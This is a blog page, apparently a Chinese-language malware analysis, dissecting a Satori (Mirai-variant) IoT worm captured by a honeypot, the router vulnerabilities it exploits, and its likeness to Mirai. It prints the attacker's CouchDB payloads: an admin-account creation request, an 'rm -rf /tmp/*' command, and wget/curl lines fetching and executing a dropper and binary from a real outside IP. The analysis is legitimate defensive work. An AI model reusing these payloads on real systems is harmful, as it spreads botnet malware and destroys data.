@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Satori 物联网蠕虫分析 | SY0U&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00 样本植入​    我们通过高交互蜜罐捕获到Satori 变种物联网蠕虫样本，Satori是一个Mirai的变种，主要是利用物联网设备的漏洞进行传播，本次捕获的样本利用了4个路由器漏洞：  ​    攻击者利用couchdb权限提升漏洞和couchdb远程命令执行漏洞向蜜罐系统植入了一个shell脚本，执行shell脚本下载样本并执行。 payload如下： 添加admin帐户，passw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Satori 物联网蠕虫分析">
+<meta property="og:url" content="http://wsygoogol.github.io/2018/09/17/Satori-物联网蠕虫分析/index.html">
+<meta property="og:site_name" content="SY0U&#39;s Blog">
+<meta property="og:description" content="0x00 样本植入​    我们通过高交互蜜罐捕获到Satori 变种物联网蠕虫样本，Satori是一个Mirai的变种，主要是利用物联网设备的漏洞进行传播，本次捕获的样本利用了4个路由器漏洞：  ​    攻击者利用couchdb权限提升漏洞和couchdb远程命令执行漏洞向蜜罐系统植入了一个shell脚本，执行shell脚本下载样本并执行。 payload如下： 添加admin帐户，passw">
+<meta property="og:image" content="d:/gitBlog/themes/landscape/source/upload_image/hdr.png">
+<meta property="og:image" content="d:/gitBlog/themes/landscape/source/upload_image/huawei_1.png">
+<meta property="og:image" content="d:/gitBlog/themes/landscape/source/upload_image/huawei_3.png">
+<meta property="og:image" content="d:/gitBlog/themes/landscape/source/upload_image/huawei_6.png">
+<meta property="og:image" content="d:/gitBlog/themes/landscape/source/upload_image/huawei5.png">
+<meta property="og:image" content="d:/gitBlog/themes/landscape/source/upload_image/huawei.png">
+<meta property="og:image" content="d:/gitBlog/themes/landscape/source/upload_image/hnap.png">
+<meta property="og:image" content="d:/gitBlog/themes/landscape/source/upload_image/dlink.png">
+<meta property="og:image" content="d:/gitBlog/themes/landscape/source/upload_image/rrr.png">
+<meta property="og:updated_time" content="2018-09-19T07:09:10.405Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Satori 物联网蠕虫分析">
+<meta name="twitter:description" content="0x00 样本植入​    我们通过高交互蜜罐捕获到Satori 变种物联网蠕虫样本，Satori是一个Mirai的变种，主要是利用物联网设备的漏洞进行传播，本次捕获的样本利用了4个路由器漏洞：  ​    攻击者利用couchdb权限提升漏洞和couchdb远程命令执行漏洞向蜜罐系统植入了一个shell脚本，执行shell脚本下载样本并执行。 payload如下： 添加admin帐户，passw">
+<meta name="twitter:image" content="d:/gitBlog/themes/landscape/source/upload_image/hdr.png">
+  
+    <link rel="alternate" href="/atom.xml" title="SY0U&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">SY0U&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="w-Satori-物联网蠕虫分析" class="article article-type-w" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/17/Satori-物联网蠕虫分析/" class="article-date">
+  <time datetime="2018-09-17T09:50:48.000Z" itemprop="datePublished">2018-09-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Satori 物联网蠕虫分析
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="0x00-样本植入"><a href="#0x00-样本植入" class="headerlink" title="0x00 样本植入"></a>0x00 样本植入</h4><p>​    我们通过高交互蜜罐捕获到Satori 变种物联网蠕虫样本，Satori是一个Mirai的变种，主要是利用物联网设备的漏洞进行传播，本次捕获的样本利用了4个路由器漏洞：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\hdr.png" alt="hdr"></p>
+<p>​    攻击者利用couchdb权限提升漏洞和couchdb远程命令执行漏洞向蜜罐系统植入了一个shell脚本，执行shell脚本下载样本并执行。</p>
+<p>payload如下：</p>
+<p>添加admin帐户，password：guest</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PUT /_users/org.couchdb.user:guest HTTP/1.1</div><div class="line"></div><div class="line">&#123;<span class="string">"type"</span>: <span class="string">"user"</span>, <span class="string">"name"</span>: <span class="string">"guest"</span>, <span class="string">"roles"</span>: [<span class="string">"_admin"</span>], <span class="string">"roles"</span>: [],<span class="string">"password"</span>: <span class="string">"guest"</span>&#125;</div></pre></td></tr></table></figure>
+<p>清空/tmp目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PUT /_config/query_servers/cmd HTTP/1.1</div><div class="line"><span class="string">"rm -rf /tmp/*"</span></div></pre></td></tr></table></figure>
+<p>wget下载shell脚本cch到/tmp目录并执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PUT /_users/org.couchdb.user:guest HTTP/1.1</div><div class="line">wget http://148.72.176.78/cch -O /tmp/cch</div><div class="line">PUT /_config/query_servers/cmd HTTP/1.1</div><div class="line">sh /tmp/cch</div></pre></td></tr></table></figure>
+<p>cch的内容如下,功能就是从服务器”148.72.176.78”下载样本ken.x86，并执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">n=<span class="string">"ken.x86"</span></div><div class="line">http_server=<span class="string">"148.72.176.78"</span></div><div class="line"><span class="built_in">dirs</span>=<span class="string">"/tmp/ /dev/ /dev/shm/ /var/ /var/run/ /var/tmp/"</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> dir <span class="keyword">in</span> <span class="variable">$dirs</span></div><div class="line"><span class="keyword">do</span></div><div class="line"> &gt;<span class="variable">$dir</span>.file &amp;&amp; <span class="built_in">cd</span> <span class="variable">$dir</span></div><div class="line"><span class="keyword">done</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$n</span></div><div class="line"><span class="keyword">do</span></div><div class="line"> cp <span class="variable">$SHELL</span> <span class="variable">$i</span></div><div class="line"> &gt;<span class="variable">$i</span></div><div class="line"> chmod 777 <span class="variable">$i</span></div><div class="line"> wget http://<span class="variable">$http_server</span>/<span class="variable">$i</span> -O- &gt;<span class="variable">$i</span> || curl -O http://<span class="variable">$http_server</span>/$</div><div class="line"> chmod 777 <span class="variable">$i</span></div><div class="line"> ./<span class="variable">$i</span></div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
+<h4 id="0x01-样本分析"><a href="#0x01-样本分析" class="headerlink" title="0x01 样本分析"></a>0x01 样本分析</h4><p>​    样本利用了4个路由器漏洞：<a href="https://www.exploit-db.com/exploits/43414/" target="_blank" rel="external">Huawei Router HG532命令执行漏洞</a>，<a href="https://www.exploit-db.com/exploits/44760/" target="_blank" rel="external">D-Link DSL-2750B OS命令注入漏洞</a>,<a href="https://www.exploit-db.com/exploits/37171/" target="_blank" rel="external">D-Link Devices HNAP SOAPAction-Header命令注入漏洞</a>,<a href="https://www.exploit-db.com/exploits/37169/" target="_blank" rel="external">Realtek SDK Miniigd UPnP SOAP命令执行漏洞</a>。这四个漏洞在之前捕获的Mirai和Satori样本中均出现过，利用的非常多。</p>
+<p>下面对Huawei Router HG532命令执行漏洞的利用过程进行分析.</p>
+<p>1.创建子进程，通过util_local_addr()获取本地IP地址：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei_1.png" alt="huawei_1"></p>
+<p>2.设置原始套接字，失败则退出：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei_3.png" alt="huawei_3"></p>
+<p>3.设置IPv4的报文头部，tcph_0-&gt;dest为目的端口：37215，tcph-&gt;source为源端口。 </p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei_6.png" alt="huawei_6"></p>
+<p>4.通过huaweiscanner_get_random_ip()函数随机生成IP地址,通过sendto()函数向对应IP的37215端口发送数据包</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei5.png" alt="huawei5"></p>
+<p>5.扫描到开放37215端口的主机后尝试使用payload建立连接，执行wget命令从指定服务器IP:148.72.176.78中下载恶意文件。</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\huawei.png" alt="huawei"></p>
+<p>​    其他三个漏洞的利用过程与上面的过程基本相同，只是换了对应的端口和payload：</p>
+<p>D-Link Devices HNAP SOAPAction-Header命令注入漏洞，攻击8081端口，payload如下：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\hnap.png" alt="hnap"></p>
+<p>D-Link DSL-2750B OS命令注入漏洞，攻击80和8080端口，payload如下：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\dlink.png" alt="dlink"></p>
+<p>Realtek SDK Miniigd UPnP SOAP命令执行漏洞，攻击52869端口，payload如下：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\rrr.png" alt="rrr"></p>
+<p>​    通过与Mirai的对比分析发现，这个样本的攻击过程与Mirai几乎一致，具有同源性，确定为Mirai变种。均是通过随机生成ip地址扫描特定的端口，Mirai扫描23端口，该样本扫描8081（Hnap）、80和8080（Dlink）、52869(Realtek)、37215（Huawei）。发现主机后，Mirai是尝试弱口令通过telnet进行登陆，而这个样本则是通过相应的payload尝试从指定主机中下载感染bot程序进行感染。 </p>
+<p>​    由于Mirai 的源码已经在网上公开，改造 Mirai ，以其变种身份形式出现，构造巨大的僵尸网络早已不是难事。这也是为什么自Mirai后，发现了大量Mirai变种形成的僵尸网络。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/09/17/Satori-物联网蠕虫分析/" data-id="cjprqg7tc00150c9lz6h4ysgc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/09/14/Suricata-tips/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Suricata tips</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/09/17/Satori-物联网蠕虫分析/">Satori 物联网蠕虫分析</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/14/Suricata-tips/">Suricata tips</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/11/开源情报收集/">开源情报收集</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/06/构建SOC的机器学习分析模型/">构建SOC的机器学习分析模型</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/21/Perl-DDOS-IrcBot分析/">Perl DDOS IrcBot分析</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <!--
+<footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 SY0U<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+-->
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
